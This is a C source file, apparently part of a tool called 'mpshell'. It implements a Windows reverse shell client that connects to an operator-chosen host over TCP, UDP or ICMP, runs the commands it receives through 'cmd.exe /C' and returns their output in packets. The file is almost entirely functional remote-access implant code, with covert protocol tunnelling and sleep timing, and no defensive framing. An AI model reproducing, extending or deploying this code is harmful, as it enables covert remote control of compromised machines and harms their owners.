#include "mpshell.h"

extern mp_command_buffer *command_buffer;
extern mp_result_buffer *result_buffer;
extern unsigned char *packet_in;
extern unsigned char *packet_out;

bool RUN                  = true;
char *host                = NULL;
char *port_string         = NULL;
int port                  = -1;
int protocol              = PROTOCOL_TCP;
uint16_t max_payload_size = DEFAULT_MAX_PAYLOAD_SIZE;
DWORD sleep_size          = DEFAULT_SLEEP;
time_t timeout            = DEFAULT_TIMEOUT;

int main(int argc, const char *argv[])
{
    char delimiter[] = "=";
    for (int i = 1; i < argc; i++)
    {
        char *param_name  = NULL;
        char *param_value = NULL;

        char *current_argument = (char *) argv[i];
        param_name = strtok(current_argument, delimiter);

        if (param_name != NULL)
            param_value = strtok(NULL, delimiter);

        if (param_name != NULL && param_value != NULL)
        {
            if (strcmp(param_name, "--host") == 0)               { host = param_value; }
            else if (strcmp(param_name, "--port") == 0)          { port = atoi(param_value); port_string = param_value; }
            else if (strcmp(param_name, "--protocol") == 0)
            {
                if (strcmp(param_value, "tcp") == 0)             { protocol = PROTOCOL_TCP; }
                else if (strcmp(param_value, "udp") == 0)        { protocol = PROTOCOL_UDP; }
                else if (strcmp(param_value, "icmp") == 0)       { protocol = PROTOCOL_ICMP; }
                else { show_usage(true); }
            }
            else if (strcmp(param_name, "--payload-size") == 0)  { max_payload_size = (size_t) atoi(param_value); }
            else if (strcmp(param_name, "--sleep") == 0)         { sleep_size       = (DWORD) (atoi(param_value)); }
            else if (strcmp(param_name, "--timeout") == 0)       { timeout          = (time_t) (atoi(param_value)); }
            else { show_usage(true); }
        }
        else { show_usage(true); }
    }

    if (host == NULL || strlen(host) == 0)                                                                        { show_usage(true); }
    else if ((protocol != PROTOCOL_ICMP) && (port <= 0 || port > 65535))                                          { show_usage(true); }
    else if ((protocol != PROTOCOL_TCP) && (sleep_size <= 0))                                                     { show_usage(true); }
    else if ((protocol != PROTOCOL_TCP) && (max_payload_size <=0 || max_payload_size > DEFAULT_MAX_PAYLOAD_SIZE)) { show_usage(true); }
    else
    {
        init_buffers();
        int status = EXIT_SUCCESS;
        switch (protocol)
        {
            case PROTOCOL_TCP:  status = open_tcp_channel(host, port_string); break;
            case PROTOCOL_UDP:  status = open_udp_channel(host, port);        break;
            case PROTOCOL_ICMP: status = open_icmp_channel(host);
        }

        cleanup();
        return status;
    }
}

void execute_command(const char *command)
{
    BOOL status;
    SECURITY_ATTRIBUTES security_attributes;
    security_attributes.nLength              = sizeof(SECURITY_ATTRIBUTES);
    security_attributes.bInheritHandle       = TRUE;
    security_attributes.lpSecurityDescriptor = NULL;

    HANDLE child_stdin_read                  = NULL;
    HANDLE child_stdin_write                 = NULL;
    HANDLE child_stdout_read                 = NULL;
    HANDLE child_stdout_write                = NULL;

    // Create a pipe for the child process's STDOUT
    if (!CreatePipe(&child_stdout_read, &child_stdout_write, &security_attributes, 0))
    {
        prepare_error_response();
        return;
    }

    // Ensure the read handle to the pipe for STDOUT is not inherited
    if (!SetHandleInformation(child_stdout_read, HANDLE_FLAG_INHERIT, 0))
    {
        prepare_error_response();
        return;
    }

    // Create a pipe for the child process's STDIN
    if (!CreatePipe(&child_stdin_read, &child_stdin_write, &security_attributes, 0))
    {
        prepare_error_response();
        return;
    }

    // Ensure the write handle to the pipe for STDIN is not inherited
    if (!SetHandleInformation(child_stdin_write, HANDLE_FLAG_INHERIT, 0))
    {
        prepare_error_response();
        return;
    }

    // Create the child process
    PROCESS_INFORMATION process_info;
    STARTUPINFO startup_info;

    ZeroMemory(&process_info, sizeof(process_info));
    ZeroMemory(&startup_info, sizeof(startup_info));        // Zero the STARTUPINFO struct
    startup_info.cb = sizeof(startup_info);                 // Must set size of structure

    startup_info.hStdError   = child_stdout_write;
    startup_info.hStdOutput  = child_stdout_write;
    startup_info.hStdInput   = child_stdin_read;
    startup_info.dwFlags    |= STARTF_USESTDHANDLES;

    char final_command[MAX_COMMAND_SIZE+11] = "cmd.exe /C ";
    strcat(final_command, command);

    status = CreateProcessA(NULL,                           // Application Name
                            final_command,                  // CommandLine
                            NULL,                           // Process Attributes
                            NULL,                           // Thread Attributes
                            TRUE,                           // Inherit Handles
                            0,                              // Creation Flags
                            NULL,                           // Environment
                            NULL,                           // Current Directory
                            (LPSTARTUPINFOA) &startup_info, // Startup Info
                            &process_info);                 // Process Information

    if (!status)
    {
        prepare_error_response();
        return;
    }

    CloseHandle(process_info.hProcess);
    CloseHandle(process_info.hThread);
    CloseHandle(child_stdout_write);
    CloseHandle(child_stdin_read);
    CloseHandle(child_stdin_write);

    // Read response
    for (;;)
    {
        char buffer[1024] = {0};
        size_t result_size = 0;
        BOOL status = ReadFile(child_stdout_read, buffer, 1024, &result_size, NULL);
        if (status == false || result_size == 0)
            break;

        if (result_size >= (result_buffer->num_bytes_allocated - result_buffer->num_bytes_occupied))
        {
            size_t new_allocated_size = (2 * result_buffer->num_bytes_allocated);
            result_buffer->data = (unsigned char *)realloc(result_buffer->data, new_allocated_size);
            result_buffer->num_bytes_allocated = new_allocated_size;
        }
        memcpy(&result_buffer->data[result_buffer->num_bytes_occupied], buffer, result_size);
        result_buffer->num_bytes_occupied += result_size;
    }
    if (result_buffer->num_bytes_occupied == 0)
    {
            prepare_ok_response();
    }
    else
    {
        result_buffer->data[result_buffer->num_bytes_occupied] = '\0';
        result_buffer->num_bytes_occupied += 1;
    }

    CloseHandle(child_stdout_read);
}

void process_packet(
    ssize_t num_bytes_received,
    mp_payload_header *header_in,
    mp_payload_header *header_out,
    unsigned char *data_in,
    unsigned char *data_out
)
{
    if (num_bytes_received < sizeof(mp_payload_header))
        return;

    uint32_t packet_id    = ntohl(header_in->packet_id);
    uint16_t payload_size = ntohs(header_in->payload_size);

    if (header_in->session_id != header_out->session_id)
        return;

    // Received packet need to be an ACK to last sent packet
    if (header_in->packet_id != header_out->packet_id)
        return;

    // Check if there is any data in the packet and save it to the command buffer
    if (payload_size > 0)
    {
        if ((payload_size == 5) &&
            (command_buffer->num_bytes_occupied == 0) &&
            ((strcmp((char *) data_in, "quit") == 0) || (strcmp((char *) data_in, "exit") == 0)))
        {
            RUN = false;
            return;
        }

        memcpy(&command_buffer->data[command_buffer->num_bytes_occupied], &data_in[0], payload_size);
        command_buffer->num_bytes_occupied += payload_size;
    }
    else
    {
        // Execute command if present at first next empty packet
        if (command_buffer->num_bytes_occupied > 0)
        {
            // Copy the command to a new buffer and redirect stderr to stdout
            char command[MAX_COMMAND_SIZE + 5];
            memcpy(command, command_buffer->data, command_buffer->num_bytes_occupied);

            if (strstr(command, "2>") == NULL)
            { strcat(command, " 2>&1"); }

            // Empty out the command buffer
            memset(command_buffer->data, 0, command_buffer->num_bytes_occupied);
            command_buffer->num_bytes_occupied = 0;

            execute_command(command);
        }

        // If there is no command to execute and the result buffer
        // is empty sleep for a period defined at command line
        else
        {
            if (result_buffer->num_bytes_occupied == 0)
                Sleep(sleep_size);
        }
    }

    header_out->packet_id = htonl(packet_id + 1);
    if (result_buffer->num_bytes_occupied > max_payload_size)
    {
        header_out->payload_size = htons(max_payload_size);
        memcpy(data_out, &result_buffer->data[result_buffer->current_read_position], max_payload_size);
        result_buffer->current_read_position += max_payload_size;
        result_buffer->num_bytes_occupied -= max_payload_size;
    }
    else if (result_buffer->num_bytes_occupied > 0)
    {
        header_out->payload_size = htons(result_buffer->num_bytes_occupied);
        memcpy(data_out, &result_buffer->data[result_buffer->current_read_position], result_buffer->num_bytes_occupied);
        result_buffer->current_read_position = 0;
        result_buffer->num_bytes_occupied = 0;
    }
    else
    {
        header_out->payload_size = htons(0);
    }
}